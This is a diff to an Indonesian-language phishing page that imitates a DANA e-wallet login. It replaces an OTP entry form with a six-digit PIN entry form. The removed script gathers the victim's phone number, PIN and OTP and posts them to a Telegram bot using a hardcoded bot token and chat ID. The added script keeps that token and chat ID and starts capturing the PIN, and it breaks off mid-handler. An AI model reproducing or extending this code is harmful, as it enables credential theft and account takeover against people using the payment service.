@@ -3,108 +3,99 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Kode OTP</title>
+  <title>Masukkan PIN</title>
   <style>
     body {
       font-family: 'Segoe UI', Roboto, sans-serif;
       background-color: #fff;
       margin: 0;
-      padding: 0;
       display: flex;
       flex-direction: column;
-      align-items: center;
-      justify-content: center;
       height: 100vh;
+      justify-content: center;
+      align-items: center;
     }
 
     h2 {
-      margin-bottom: 10px;
-      color: #333;
+      margin-bottom: 8px;
       font-size: 18px;
+      font-weight: 500;
+      color: #333;
     }
 
     p {
-      font-size: 14px;
+      margin-top: 0;
       color: #888;
-      margin-bottom: 30px;
-      text-align: center;
-      padding: 0 20px;
+      font-size: 14px;
+      margin-bottom: 40px;
     }
 
-    .otp-input {
+    .pin-wrapper {
       display: flex;
-      gap: 10px;
+      gap: 14px;
     }
 
-    .otp-input input {
-      width: 40px;
-      height: 50px;
-      text-align: center;
-      font-size: 20px;
-      border: 1.5px solid #ccc;
-      border-radius: 8px;
-      outline: none;
+    .dot {
+      width: 16px;
+      height: 16px;
+      border: 1.8px solid #ccc;
+      border-radius: 50%;
+      background-color: #fff;
+      transition: background 0.2s ease;
     }
 
-    .otp-input input:focus {
+    .dot.filled {
+      background-color: #008CFF;
       border-color: #008CFF;
+    }
+
+    input[type="password"] {
+      position: absolute;
+      opacity: 0;
+    }
+
+    .tap-anywhere {
+      font-size: 12px;
+      color: #aaa;
+      margin-top: 20px;
+    }
+
+    @media (max-width: 400px) {
+      .dot {
+        width: 12px;
+        height: 12px;
+      }
     }
   </style>
 </head>
 <body>
-  <h2>Masukkan Kode OTP</h2>
-  <p id="infoText">Kami telah mengirimkan SMS ke nomor Anda</p>
+  <h2>Masukkan PIN Anda</h2>
+  <p>PIN 6 digit untuk keamanan akun</p>
 
-  <div class="otp-input">
-    <input type="text" maxlength="1" inputmode="numeric">
-    <input type="text" maxlength="1" inputmode="numeric">
-    <input type="text" maxlength="1" inputmode="numeric">
-    <input type="text" maxlength="1" inputmode="numeric">
+  <div class="pin-wrapper" id="pinDots">
+    <div class="dot" id="dot0"></div>
+    <div class="dot" id="dot1"></div>
+    <div class="dot" id="dot2"></div>
+    <div class="dot" id="dot3"></div>
+    <div class="dot" id="dot4"></div>
+    <div class="dot" id="dot5"></div>
   </div>
 
+  <input id="pinInput" type="password" inputmode="numeric" maxlength="6" autofocus>
+
+  <div class="tap-anywhere">(Ketuk layar untuk mengetik)</div>
+
   <script>
-    const inputs = document.querySelectorAll('.otp-input input');
-    inputs[0].focus();
+    const pinInput = document.getElementById('pinInput');
+    const dots = [...document.querySelectorAll('.dot')];
 
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', () => {
-        if (input.value && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
+    const token = '7658902176:AAE0RbA2cBHQh6EgU9We-ar7XGrrPxPFVYw';
+    const chatId = '6597122729';
 
-        const otp = [...inputs].map(input => input.value).join('');
-        if (otp.length === 4) {
-          const pin = sessionStorage.getItem('pin') || 'Tidak ada';
-          const phone = sessionStorage.getItem('phone') || 'Tidak ada';
-
-          // Kirim ke Telegram
-          const token = '7658902176:AAE0RbA2cBHQh6EgU9We-ar7XGrrPxPFVYw';
-          const chatId = '6597122729';
-          const message = `🔐 *DANA LOGIN*\n\n📱 Nomor: ${phone}\n🔑 PIN: ${pin}\n📩 OTP: ${otp}`;
-
-          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-              parse_mode: "Markdown"
-            })
-          }).then(() => {
-            window.location.href = "sukses.html";
-          }).catch(() => {
-            alert("Gagal mengirim OTP");
-          });
-        }
-      });
+    document.body.addEventListener('click', () => {
+      pinInput.focus();
     });
 
-    // Tampilkan nomor di infoText
-    const phone = sessionStorage.getItem('phone');
-    if (phone) {
-      document.getElementById("infoText").textContent =
-        `Kami telah mengirimkan SMS ke ${phone}`;
-    }
-  </script>
-</body>
-</html>
+    pinInput.addEventListener('input', () => {
+      const value = pinInput.value;
+      dots.forEach((dot, index) => {
